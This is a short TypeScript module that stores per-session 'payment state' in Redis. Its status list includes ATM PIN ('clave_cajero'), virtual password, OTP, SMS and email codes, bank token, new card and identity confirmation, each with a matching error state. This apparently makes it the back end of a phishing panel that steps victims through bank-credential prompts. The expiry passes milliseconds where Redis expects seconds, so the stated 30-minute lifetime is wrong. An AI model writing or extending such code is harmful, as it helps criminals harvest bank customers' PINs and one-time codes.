import redis from "@/lib/redis";

const THIRTY_MINUTES = 30 * 60 * 1000;
const PREFIX = 'payment-state:';

export type PaymentStatus = 'loading' | 'otp' | 'error_otp' | 'user' | 'error_user' | 'error_password' | 'new_card' | 'code_sms' | 'error_code_sms' | 'code_email' | 'error_code_email' | 'token' | 'error_token' | 'clave_cajero' | 'error_clave_cajero' | 'clave_virtual' | 'error_clave_virtual' | 'confirmar_identidad' | 'finalized' | 'banned';

export interface PaymentState {
    status: PaymentStatus;
    timestamp: number;
    data?: any;
}


export async function savePaymentState(
    sessionId: string,
    state: PaymentState
): Promise<void> {
    try {
        const key = `${PREFIX}${sessionId}`;

        await redis.set(
            key,
            JSON.stringify(state),
            {
                EX: THIRTY_MINUTES, 
            }
        );
    } catch (error) {
        console.error('Error saving payment state:', error);
    }
}

export async function getPaymentState(
  sessionId: string
): Promise<PaymentState | null> {
  try {
    const key = `${PREFIX}${sessionId}`;
    const data = await redis.get(key);

    if (!data) return null;

    return JSON.parse(data) as PaymentState;
  } catch (error) {
    console.error('Error reading payment state:', error);
    return null;
  }
}

export async function deletePaymentState(sessionId: string): Promise<void> {
  try {
    const key = `${PREFIX}${sessionId}`;
    await redis.del(key);
  } catch (error) {
    console.error('Error deleting payment state:', error);
  }
}
